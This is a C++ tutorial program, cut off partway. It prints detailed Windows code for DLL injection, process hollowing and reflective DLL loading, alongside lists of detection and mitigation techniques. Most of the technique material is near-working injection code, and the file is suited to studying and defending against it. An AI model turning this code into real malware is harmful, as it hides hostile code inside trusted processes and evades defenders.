/**
 * Code Injection Techniques - Educational Overview
 * 
 * This program demonstrates various code injection techniques
 * used to execute code in other processes.
 * 
 * EDUCATIONAL PURPOSE ONLY: This code is meant for learning how these
 * techniques work to improve detection capabilities, not for malicious use.
 */

#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>

// Forward declarations
void demonstrate_dll_injection();
void demonstrate_process_hollowing();
void demonstrate_reflective_loading();
void demonstrate_thread_hijacking();
void demonstrate_fileless_execution();

/**
 * Main function to demonstrate various code injection techniques
 */
int main() {
    std::cout << "=== Code Injection Techniques - Educational Overview ===\n";
    std::cout << "EDUCATIONAL PURPOSE ONLY: This code demonstrates techniques\n";
    std::cout << "to improve detection capabilities, not for malicious use.\n\n";
    
    int choice = 0;
    
    do {
        std::cout << "\nSelect a code injection technique to learn about:\n";
        std::cout << "1. DLL Injection\n";
        std::cout << "2. Process Hollowing\n";
        std::cout << "3. Reflective Loading\n";
        std::cout << "4. Thread Execution Hijacking\n";
        std::cout << "5. Fileless (Memory-only) Execution\n";
        std::cout << "0. Exit\n";
        std::cout << "Enter your choice: ";
        
        std::cin >> choice;
        
        switch (choice) {
            case 1:
                demonstrate_dll_injection();
                break;
            case 2:
                demonstrate_process_hollowing();
                break;
            case 3:
                demonstrate_reflective_loading();
                break;
            case 4:
                demonstrate_thread_hijacking();
                break;
            case 5:
                demonstrate_fileless_execution();
                break;
            case 0:
                std::cout << "Exiting...\n";
                break;
            default:
                std::cout << "Invalid choice. Please try again.\n";
        }
        
    } while (choice != 0);
    
    return 0;
}

/**
 * Helper function to find a process ID by name
 */
DWORD find_process_id(const std::string& process_name) {
    DWORD process_id = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 process_entry;
        process_entry.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(snapshot, &process_entry)) {
            do {
                if (process_name == process_entry.szExeFile) {
                    process_id = process_entry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &process_entry));
        }
        
        CloseHandle(snapshot);
    }
    
    return process_id;
}

/**
 * Demonstrate DLL injection technique
 */
void demonstrate_dll_injection() {
    std::cout << "\n=== DLL Injection ===\n";
    
    std::cout << "DLL injection is a technique that involves injecting a dynamic-link\n";
    std::cout << "library (DLL) into a running process, causing the process to load\n";
    std::cout << "and execute the code within the DLL.\n\n";
    
    // Explain how DLL injection works
    std::cout << "How DLL injection works:\n";
    std::cout << "1. Open a handle to the target process\n";
    std::cout << "2. Allocate memory in the target process\n";
    std::cout << "3. Write the path of the DLL to the allocated memory\n";
    std::cout << "4. Create a remote thread in the target process that calls LoadLibrary\n";
    std::cout << "5. The DLL's DllMain function is executed in the context of the target process\n\n";
    
    // Demonstrate the DLL injection process (without actually injecting)
    std::cout << "DLL injection process (pseudocode):\n";
    std::cout << "```cpp\n";
    std::cout << "// Target process and DLL path\n";
    std::cout << "const char* target_process = \"notepad.exe\";\n";
    std::cout << "const char* dll_path = \"C:\\\\path\\\\to\\\\my_dll.dll\";\n\n";
    
    std::cout << "// Find the process ID\n";
    std::cout << "DWORD process_id = find_process_id(target_process);\n";
    std::cout << "if (process_id == 0) {\n";
    std::cout << "    std::cout << \"Target process not found.\\n\";\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Open a handle to the process\n";
    std::cout << "HANDLE process_handle = OpenProcess(\n";
    std::cout << "    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | \n";
    std::cout << "    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,\n";
    std::cout << "    FALSE, process_id);\n\n";
    
    std::cout << "if (process_handle == NULL) {\n";
    std::cout << "    std::cout << \"Failed to open process.\\n\";\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Allocate memory in the target process\n";
    std::cout << "LPVOID remote_memory = VirtualAllocEx(\n";
    std::cout << "    process_handle, NULL, strlen(dll_path) + 1,\n";
    std::cout << "    MEM_COMMIT, PAGE_READWRITE);\n\n";
    
    std::cout << "if (remote_memory == NULL) {\n";
    std::cout << "    std::cout << \"Failed to allocate memory in the target process.\\n\";\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Write the DLL path to the allocated memory\n";
    std::cout << "if (!WriteProcessMemory(\n";
    std::cout << "    process_handle, remote_memory, dll_path,\n";
    std::cout << "    strlen(dll_path) + 1, NULL)) {\n";
    std::cout << "    std::cout << \"Failed to write to the target process's memory.\\n\";\n";
    std::cout << "    VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Get the address of LoadLibraryA\n";
    std::cout << "LPVOID load_library_addr = (LPVOID)GetProcAddress(\n";
    std::cout << "    GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\");\n\n";
    
    std::cout << "if (load_library_addr == NULL) {\n";
    std::cout << "    std::cout << \"Failed to get the address of LoadLibraryA.\\n\";\n";
    std::cout << "    VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Create a remote thread that calls LoadLibraryA\n";
    std::cout << "HANDLE remote_thread = CreateRemoteThread(\n";
    std::cout << "    process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_addr,\n";
    std::cout << "    remote_memory, 0, NULL);\n\n";
    
    std::cout << "if (remote_thread == NULL) {\n";
    std::cout << "    std::cout << \"Failed to create remote thread.\\n\";\n";
    std::cout << "    VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Wait for the thread to complete\n";
    std::cout << "WaitForSingleObject(remote_thread, INFINITE);\n\n";
    
    std::cout << "// Clean up\n";
    std::cout << "CloseHandle(remote_thread);\n";
    std::cout << "VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);\n";
    std::cout << "CloseHandle(process_handle);\n";
    std::cout << "```\n\n";
    
    // Example DLL code
    std::cout << "Example DLL code (my_dll.dll):\n";
    std::cout << "```cpp\n";
    std::cout << "#include <Windows.h>\n\n";
    
    std::cout << "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n";
    std::cout << "    switch (ul_reason_for_call) {\n";
    std::cout << "        case DLL_PROCESS_ATTACH:\n";
    std::cout << "            // Code to execute when the DLL is loaded\n";
    std::cout << "            MessageBox(NULL, \"DLL Injected Successfully!\", \"Injection Demo\", MB_OK);\n";
    std::cout << "            break;\n";
    std::cout << "        case DLL_THREAD_ATTACH:\n";
    std::cout << "        case DLL_THREAD_DETACH:\n";
    std::cout << "        case DLL_PROCESS_DETACH:\n";
    std::cout << "            break;\n";
    std::cout << "    }\n";
    std::cout << "    return TRUE;\n";
    std::cout << "}\n";
    std::cout << "```\n\n";
    
    // Variations of DLL injection
    std::cout << "Variations of DLL injection:\n";
    std::cout << "1. SetWindowsHookEx injection\n";
    std::cout << "   - Uses Windows hooks to inject a DLL into processes\n";
    std::cout << "   - The DLL is loaded when a specific event occurs\n\n";
    
    std::cout << "2. AppInit_DLLs registry key\n";
    std::cout << "   - Configures DLLs to be loaded by all processes that use user32.dll\n";
    std::cout << "   - Requires administrative privileges\n\n";
    
    std::cout << "3. Registry modification for specific applications\n";
    std::cout << "   - Modifies application-specific registry keys to load custom DLLs\n";
    std::cout << "   - Example: AppInitDLLs, LoadAppInit_DLLs\n\n";
    
    std::cout << "4. DLL redirection/proxying\n";
    std::cout << "   - Replaces or redirects legitimate DLLs with malicious ones\n";
    std::cout << "   - Uses search order hijacking or DLL proxying techniques\n\n";
    
    // Detection and mitigation
    std::cout << "Detection techniques:\n";
    std::cout << "1. Monitor for suspicious API calls:\n";
    std::cout << "   - VirtualAllocEx, WriteProcessMemory, CreateRemoteThread\n";
    std::cout << "   - GetProcAddress with \"LoadLibraryA\" or \"LoadLibraryW\"\n\n";
    
    std::cout << "2. Monitor for unexpected DLL loading:\n";
    std::cout << "   - DLLs loaded from unusual locations\n";
    std::cout << "   - DLLs with suspicious names or without digital signatures\n\n";
    
    std::cout << "3. Process memory scanning:\n";
    std::cout << "   - Look for injected DLL modules\n";
    std::cout << "   - Compare loaded modules against those on disk\n\n";
    
    std::cout << "4. Registry monitoring:\n";
    std::cout << "   - Watch for changes to AppInit_DLLs and similar registry keys\n";
    std::cout << "   - Monitor for DLL redirection attempts\n\n";
    
    std::cout << "Mitigation techniques:\n";
    std::cout << "1. Application whitelisting\n";
    std::cout << "2. Code signing and verification\n";
    std::cout << "3. Process isolation and sandboxing\n";
    std::cout << "4. Endpoint protection with behavior monitoring\n";
    std::cout << "5. Restrict access to sensitive API functions\n";
}

/**
 * Demonstrate process hollowing technique
 */
void demonstrate_process_hollowing() {
    std::cout << "\n=== Process Hollowing ===\n";
    
    std::cout << "Process hollowing (also known as process replacement or runPE) is a technique\n";
    std::cout << "that involves creating a process in a suspended state, unmapping its memory,\n";
    std::cout << "and replacing it with malicious code before resuming execution.\n\n";
    
    // Explain how process hollowing works
    std::cout << "How process hollowing works:\n";
    std::cout << "1. Create a new process in a suspended state\n";
    std::cout << "2. Unmap (hollow out) the memory of the suspended process\n";
    std::cout << "3. Allocate memory in the suspended process\n";
    std::cout << "4. Write the malicious executable into the allocated memory\n";
    std::cout << "5. Update the process context (entry point)\n";
    std::cout << "6. Resume the suspended thread to execute the malicious code\n\n";
    
    // Demonstrate the process hollowing technique (without actually performing it)
    std::cout << "Process hollowing technique (pseudocode):\n";
    std::cout << "```cpp\n";
    std::cout << "// Target process to create and hollow\n";
    std::cout << "const char* target_process = \"svchost.exe\";\n";
    std::cout << "// Malicious executable to inject\n";
    std::cout << "const char* malicious_exe = \"C:\\\\path\\\\to\\\\malware.exe\";\n\n";
    
    std::cout << "// Create the target process in suspended state\n";
    std::cout << "STARTUPINFO si = { sizeof(STARTUPINFO) };\n";
    std::cout << "PROCESS_INFORMATION pi;\n";
    std::cout << "if (!CreateProcess(\n";
    std::cout << "    target_process, NULL, NULL, NULL, FALSE,\n";
    std::cout << "    CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {\n";
    std::cout << "    std::cout << \"Failed to create process.\\n\";\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Get the process context\n";
    std::cout << "CONTEXT context;\n";
    std::cout << "context.ContextFlags = CONTEXT_FULL;\n";
    std::cout << "if (!GetThreadContext(pi.hThread, &context)) {\n";
    std::cout << "    std::cout << \"Failed to get thread context.\\n\";\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Read the PEB address to find the image base\n";
    std::cout << "#ifdef _WIN64\n";
    std::cout << "    DWORD64 peb_address = context.Rdx;\n";
    std::cout << "#else\n";
    std::cout << "    DWORD peb_address = context.Ebx;\n";
    std::cout << "#endif\n\n";
    
    std::cout << "// Read the image base address from the PEB\n";
    std::cout << "LPVOID image_base_address;\n";
    std::cout << "SIZE_T bytes_read;\n";
    std::cout << "if (!ReadProcessMemory(\n";
    std::cout << "    pi.hProcess,\n";
    std::cout << "    (LPCVOID)(peb_address + 0x10),  // Offset to image base in PEB\n";
    std::cout << "    &image_base_address, sizeof(LPVOID), &bytes_read)) {\n";
    std::cout << "    std::cout << \"Failed to read image base address.\\n\";\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Open the malicious executable file\n";
    std::cout << "HANDLE malicious_file = CreateFile(\n";
    std::cout << "    malicious_exe, GENERIC_READ, FILE_SHARE_READ, NULL,\n";
    std::cout << "    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n\n";
    
    std::cout << "if (malicious_file == INVALID_HANDLE_VALUE) {\n";
    std::cout << "    std::cout << \"Failed to open malicious executable.\\n\";\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Read the malicious executable into memory\n";
    std::cout << "DWORD file_size = GetFileSize(malicious_file, NULL);\n";
    std::cout << "LPVOID malicious_data = VirtualAlloc(\n";
    std::cout << "    NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n";
    
    std::cout << "if (malicious_data == NULL) {\n";
    std::cout << "    std::cout << \"Failed to allocate memory for malicious data.\\n\";\n";
    std::cout << "    CloseHandle(malicious_file);\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Read the malicious file content\n";
    std::cout << "DWORD bytes_read;\n";
    std::cout << "if (!ReadFile(malicious_file, malicious_data, file_size, &bytes_read, NULL)) {\n";
    std::cout << "    std::cout << \"Failed to read malicious file.\\n\";\n";
    std::cout << "    VirtualFree(malicious_data, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(malicious_file);\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Parse the PE headers of the malicious executable\n";
    std::cout << "PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)malicious_data;\n";
    std::cout << "PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((LPBYTE)malicious_data + dos_header->e_lfanew);\n\n";
    
    std::cout << "// Unmap the target process's memory\n";
    std::cout << "if (!NtUnmapViewOfSection(pi.hProcess, image_base_address)) {\n";
    std::cout << "    std::cout << \"Failed to unmap target process memory.\\n\";\n";
    std::cout << "    VirtualFree(malicious_data, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(malicious_file);\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Allocate memory in the target process for the malicious executable\n";
    std::cout << "LPVOID target_base_address = VirtualAllocEx(\n";
    std::cout << "    pi.hProcess, image_base_address, nt_headers->OptionalHeader.SizeOfImage,\n";
    std::cout << "    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n";
    
    std::cout << "if (target_base_address == NULL) {\n";
    std::cout << "    std::cout << \"Failed to allocate memory in target process.\\n\";\n";
    std::cout << "    VirtualFree(malicious_data, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(malicious_file);\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Write the headers of the malicious executable to the target process\n";
    std::cout << "if (!WriteProcessMemory(\n";
    std::cout << "    pi.hProcess, target_base_address, malicious_data,\n";
    std::cout << "    nt_headers->OptionalHeader.SizeOfHeaders, NULL)) {\n";
    std::cout << "    std::cout << \"Failed to write headers to target process.\\n\";\n";
    std::cout << "    VirtualFree(malicious_data, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(malicious_file);\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Write each section of the malicious executable to the target process\n";
    std::cout << "PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);\n";
    std::cout << "for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {\n";
    std::cout << "    if (!WriteProcessMemory(\n";
    std::cout << "        pi.hProcess,\n";
    std::cout << "        (LPVOID)((LPBYTE)target_base_address + section[i].VirtualAddress),\n";
    std::cout << "        (LPVOID)((LPBYTE)malicious_data + section[i].PointerToRawData),\n";
    std::cout << "        section[i].SizeOfRawData, NULL)) {\n";
    std::cout << "        std::cout << \"Failed to write section \" << i << \" to target process.\\n\";\n";
    std::cout << "        VirtualFree(malicious_data, 0, MEM_RELEASE);\n";
    std::cout << "        CloseHandle(malicious_file);\n";
    std::cout << "        TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "        CloseHandle(pi.hThread);\n";
    std::cout << "        CloseHandle(pi.hProcess);\n";
    std::cout << "        return;\n";
    std::cout << "    }\n";
    std::cout << "}\n\n";
    
    std::cout << "// Update the process context to point to the new entry point\n";
    std::cout << "#ifdef _WIN64\n";
    std::cout << "    context.Rcx = (DWORD64)((LPBYTE)target_base_address + nt_headers->OptionalHeader.AddressOfEntryPoint);\n";
    std::cout << "#else\n";
    std::cout << "    context.Eax = (DWORD)((LPBYTE)target_base_address + nt_headers->OptionalHeader.AddressOfEntryPoint);\n";
    std::cout << "#endif\n\n";
    
    std::cout << "// Update the PEB to point to the new image base\n";
    std::cout << "if (!WriteProcessMemory(\n";
    std::cout << "    pi.hProcess, (LPVOID)(peb_address + 0x10),\n";
    std::cout << "    &target_base_address, sizeof(LPVOID), NULL)) {\n";
    std::cout << "    std::cout << \"Failed to update PEB.\\n\";\n";
    std::cout << "    VirtualFree(malicious_data, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(malicious_file);\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Set the new thread context\n";
    std::cout << "if (!SetThreadContext(pi.hThread, &context)) {\n";
    std::cout << "    std::cout << \"Failed to set thread context.\\n\";\n";
    std::cout << "    VirtualFree(malicious_data, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(malicious_file);\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Resume the thread to execute the malicious code\n";
    std::cout << "if (ResumeThread(pi.hThread) == -1) {\n";
    std::cout << "    std::cout << \"Failed to resume thread.\\n\";\n";
    std::cout << "    VirtualFree(malicious_data, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(malicious_file);\n";
    std::cout << "    TerminateProcess(pi.hProcess, 0);\n";
    std::cout << "    CloseHandle(pi.hThread);\n";
    std::cout << "    CloseHandle(pi.hProcess);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Clean up\n";
    std::cout << "VirtualFree(malicious_data, 0, MEM_RELEASE);\n";
    std::cout << "CloseHandle(malicious_file);\n";
    std::cout << "CloseHandle(pi.hThread);\n";
    std::cout << "CloseHandle(pi.hProcess);\n";
    std::cout << "```\n\n";
    
    // Variations of process hollowing
    std::cout << "Variations of process hollowing:\n";
    std::cout << "1. Partial hollowing\n";
    std::cout << "   - Only replace specific sections of the target process\n";
    std::cout << "   - Maintains some of the original code to appear legitimate\n\n";
    
    std::cout << "2. Module stomping\n";
    std::cout << "   - Targets specific loaded modules instead of the main executable\n";
    std::cout << "   - Replaces DLL code in memory with malicious code\n\n";
    
    std::cout << "3. PE header manipulation\n";
    std::cout << "   - Modifies PE headers to hide the true nature of the code\n";
    std::cout << "   - Can make memory scanning more difficult\n\n";
    
    // Detection and mitigation
    std::cout << "Detection techniques:\n";
    std::cout << "1. Monitor for suspicious process creation:\n";
    std::cout << "   - Processes created in suspended state\n";
    std::cout << "   - Unusual parent-child process relationships\n\n";
    
    std::cout << "2. Memory scanning:\n";
    std::cout << "   - Compare in-memory PE headers with on-disk versions\n";
    std::cout << "   - Look for unmapped/remapped memory regions\n";
    std::cout << "   - Check for executable memory with modified permissions\n\n";
    
    std::cout << "3. API monitoring:\n";
    std::cout << "   - CreateProcess with CREATE_SUSPENDED flag\n";
    std::cout << "   - NtUnmapViewOfSection or ZwUnmapViewOfSection\n";
    std::cout << "   - WriteProcessMemory followed by SetThreadContext and ResumeThread\n\n";
    
    std::cout << "4. Behavioral analysis:\n";
    std::cout << "   - Process memory modifications before execution\n";
    std::cout << "   - Unexpected thread execution paths\n";
    std::cout << "   - Discrepancies between process name and behavior\n\n";
    
    std::cout << "Mitigation techniques:\n";
    std::cout << "1. Application whitelisting and code signing\n";
    std::cout << "2. Memory integrity validation\n";
    std::cout << "3. Behavior-based detection systems\n";
    std::cout << "4. Restrict access to process manipulation APIs\n";
    std::cout << "5. Use of protected processes and secure boot\n";
}

/**
 * Demonstrate reflective loading technique
 */
void demonstrate_reflective_loading() {
    std::cout << "\n=== Reflective Loading ===\n";
    
    std::cout << "Reflective loading is a technique that allows loading a DLL from memory\n";
    std::cout << "without using the standard Windows API functions like LoadLibrary.\n";
    std::cout << "This technique can bypass security controls that monitor API calls.\n\n";
    
    // Explain how reflective loading works
    std::cout << "How reflective loading works:\n";
    std::cout << "1. The DLL contains a special bootstrap function (ReflectiveLoader)\n";
    std::cout << "2. This function manually maps the DLL into memory without using LoadLibrary\n";
    std::cout << "3. It resolves imports, relocations, and other PE structures\n";
    std::cout << "4. It calls the DLL's entry point (DllMain) to initialize the DLL\n";
    std::cout << "5. The entire process happens in memory without touching the disk\n\n";
    
    // Demonstrate the reflective loading process (simplified pseudocode)
    std::cout << "Reflective loading process (simplified pseudocode):\n";
    std::cout << "```cpp\n";
    std::cout << "// Function to reflectively load a DLL from memory\n";
    std::cout << "HMODULE ReflectiveLoader(LPVOID dll_data) {\n";
    std::cout << "    // Parse the PE headers\n";
    std::cout << "    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_data;\n";
    std::cout << "    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((LPBYTE)dll_data + dos_header->e_lfanew);\n\n";
    
    std::cout << "    // Allocate memory for the DLL\n";
    std::cout << "    LPVOID base_address = VirtualAlloc(\n";
    std::cout << "        NULL, nt_headers->OptionalHeader.SizeOfImage,\n";
    std::cout << "        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n";
    
    std::cout << "    if (!base_address) {\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Copy the headers\n";
    std::cout << "    memcpy(base_address, dll_data, nt_headers->OptionalHeader.SizeOfHeaders);\n\n";
    
    std::cout << "    // Copy each section\n";
    std::cout << "    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);\n";
    std::cout << "    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {\n";
    std::cout << "        memcpy(\n";
    std::cout << "            (LPBYTE)base_address + section[i].VirtualAddress,\n";
    std::cout << "            (LPBYTE)dll_data + section[i].PointerToRawData,\n";
    std::cout << "            section[i].SizeOfRawData\n";
    std::cout << "        );\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Process relocations\n";
    std::cout << "    if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {\n";
    std::cout << "        DWORD_PTR delta = (DWORD_PTR)base_address - nt_headers->OptionalHeader.ImageBase;\n";
    std::cout << "        PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(\n";
    std::cout << "            (LPBYTE)base_address +\n";
    std::cout << "            nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress\n";
    std::cout << "        );\n\n";
    
    std::cout << "        while (relocation->VirtualAddress) {\n";
    std::cout << "            PWORD relocation_info = (PWORD)((LPBYTE)relocation + sizeof(IMAGE_BASE_RELOCATION));\n";
    std::cout << "            DWORD relocation_count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n\n";
    
    std::cout << "            for (DWORD i = 0; i < relocation_count; i++) {\n";
    std::cout << "                if (relocation_info[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {\n";
    std::cout << "                    PDWORD_PTR address = (PDWORD_PTR)(\n";
    std::cout << "                        (LPBYTE)base_address +\n";
    std::cout << "                        relocation->VirtualAddress +\n";
    std::cout << "                        (relocation_info[i] & 0xFFF)\n";
    std::cout << "                    );\n";
    std::cout << "                    *address += delta;\n";
    std::cout << "                }\n";
    std::cout << "            }\n\n";
    
    std::cout << "            relocation = (PIMAGE_BASE_RELOCATION)(\n";
    std::cout << "                (LPBYTE)relocation + relocation->SizeOfBlock\n";
    std::cout << "            );\n";
    std::cout << "        }\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Resolve imports\n";
    std::cout << "    if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {\n";
    std::cout << "        PIMAGE_IMPORT_DESCRIPTOR import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(\n";
    std::cout << "            (LPBYTE)base_address +\n";
    std::cout << "            nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress\n";
    std::cout << "        );\n\n";
    
    std::cout << "        while (import_descriptor->Name) {\n";
    std::cout << "            PSTR module_name = (PSTR)((LPBYTE)base_address + import_descriptor->Name);\n";
    std::cout << "            HMODULE module = LoadLibraryA(module_name);\n\n";
    
    std::cout << "            if (!module) {\n";
    std::cout << "                // Failed to load a required module\n";
    std::cout << "                VirtualFree(base_address, 0, MEM_RELEASE);\n";
    std::cout << "                return NULL;\n";
    std::cout << "            }\n\n";
    
    std::cout << "            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(\n";
    std::cout << "                (LPBYTE)base_address + import_descriptor->FirstThunk\n";
    std::cout << "            );\n\n";
    
    std::cout << "            PIMAGE_THUNK_DATA original_thunk = (PIMAGE_THUNK_DATA)(\n";
    std::cout << "                (LPBYTE)base_address + import_descriptor->OriginalFirstThunk\n";
    std::cout << "            );\n\n";
    
    std::cout << "            while (thunk->u1.AddressOfData) {\n";
    std::cout << "                FARPROC function_address;\n\n";
    
    std::cout << "                if (original_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {\n";
    std::cout << "                    // Import by ordinal\n";
    std::cout << "                    function_address = GetProcAddress(\n";
    std::cout << "                        module, (LPCSTR)(original_thunk->u1.Ordinal & 0xFFFF)\n";
    std::cout << "                    );\n";
    std::cout << "                } else {\n";
    std::cout << "                    // Import by name\n";
    std::cout << "                    PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)(\n";
    std::cout << "                        (LPBYTE)base_address + original_thunk->u1.AddressOfData\n";
    std::cout << "                    );\n";
    std::cout << "                    function_address = GetProcAddress(module, import_by_name->Name);\n";
    std::cout << "                }\n\n";
    
    std::cout << "                if (!function_address) {\n";
    std::cout << "                    // Failed to resolve an import\n";
    std::cout << "                    VirtualFree(base_address, 0, MEM_RELEASE);\n";
    std::cout << "                    return NULL;\n";
    std::cout << "                }\n\n";
    
    std::cout << "                thunk->u1.Function = (DWORD_PTR)function_address;\n";
    std::cout << "                thunk++;\n";
    std::cout << "                original_thunk++;\n";
    std::cout << "            }\n\n";
    
    std::cout << "            import_descriptor++;\n";
    std::cout << "        }\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Set memory protections for each section\n";
    std::cout << "    section = IMAGE_FIRST_SECTION(nt_headers);\n";
    std::cout << "    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {\n";
    std::cout << "        DWORD protection = PAGE_READWRITE;\n";
    std::cout << "        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {\n";
    std::cout << "            protection = PAGE_EXECUTE_READ;\n";
    std::cout << "        }\n\n";
    
    std::cout << "        DWORD old_protection;\n";
    std::cout << "        VirtualProtect(\n";
    std::cout << "            (LPBYTE)base_address + section[i].VirtualAddress,\n";
    std::cout << "            section[i].Misc.VirtualSize,\n";
    std::cout << "            protection,\n";
    std::cout << "            &old_protection\n";
    std::cout << "        );\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Call DllMain\n";
    std::cout << "    DWORD_PTR entry_point = (DWORD_PTR)base_address + nt_headers->OptionalHeader.AddressOfEntryPoint;\n";
    std::cout << "    BOOL (WINAPI *DllMain)(HINSTANCE, DWORD, LPVOID) = (BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID))entry_point;\n";
    std::cout << "    DllMain((HINSTANCE)base_address, DLL_PROCESS_ATTACH, NULL);\n\n";
    
    std::cout << "    return (HMODULE)base_address;\n";
    std::cout << "}\n";
    std::cout << "```\n\n";
    
    // Example of using reflective loading
    std::cout << "Example of using reflective loading:\n";
    std::cout << "```cpp\n";
    std::cout << "// Load a DLL from a file into memory\n";
